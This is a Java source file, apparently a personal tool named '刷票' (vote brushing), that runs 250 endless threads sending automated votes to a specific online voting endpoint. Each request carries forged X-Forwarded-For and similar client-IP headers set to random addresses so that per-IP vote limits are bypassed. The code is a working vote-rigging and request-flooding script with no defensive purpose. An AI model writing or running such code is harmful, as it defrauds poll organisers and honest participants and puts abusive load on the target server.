/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.tools.玩玩;

import java.io.IOException;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

/**
 *
 * @author Administrator
 */
public class 刷票 {

    public static void main(String[] args) {
        for (int i = 0; i < 250; i++) {
            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true) {
                        try {
                            Thread.sleep(500);
                        } catch (InterruptedException ex) {
                            ex.printStackTrace();
                        }                       //http://kn2013.hunantv.com/klns.php?itemid=2825&callback=jQuery17203604365031891007_1377856895921&_=1377856995477
                        String httpGet = httpGet("http://a.mmvtc.cn/shelian/Article/SubmitVote?X-Requested-With=XMLHttpRequest&item50=221&voteid=35"+ "&r=" + Math.round(Math.random() * 99999), "utf-8", getRIP());
                    }
                }
            });
            thread.start();
        }
    }

    /**
     * http get请求
     *
     * @param url
     * @return
     */
    public static String httpGet(String url, String encoding, String ip) {

        HttpGet httpRequest = new HttpGet(url);
        httpRequest.setHeader("Content-Encoding", encoding);
        httpRequest.setHeader("x-forwarded-for", ip);
        httpRequest.setHeader("WL-Proxy-Client-IP", ip);
        httpRequest.setHeader("Proxy-Client-IP", ip);
        httpRequest.setHeader("http_client_ip", ip);
        httpRequest.setHeader("HTTP_X_FORWARDED_FOR", ip);
        httpRequest.setHeader("X-real-ip", ip);
        HttpClient httpclient = new DefaultHttpClient();
        HttpResponse httpResponse;
        try {
            httpResponse = httpclient.execute(httpRequest);
            // 请求成功
            if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
                String strResult = EntityUtils.toString(httpResponse.getEntity());
               // System.out.println(ip + ":" + strResult);
                return strResult;
            }
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } 
        return "ex";
    }

    private static String getRIP() {
        return Math.round(Math.random() * 255) + "." + Math.round(Math.random() * 255) + "." + Math.round(Math.random() * 255) + "." + Math.round(Math.random() * 255);
    }
}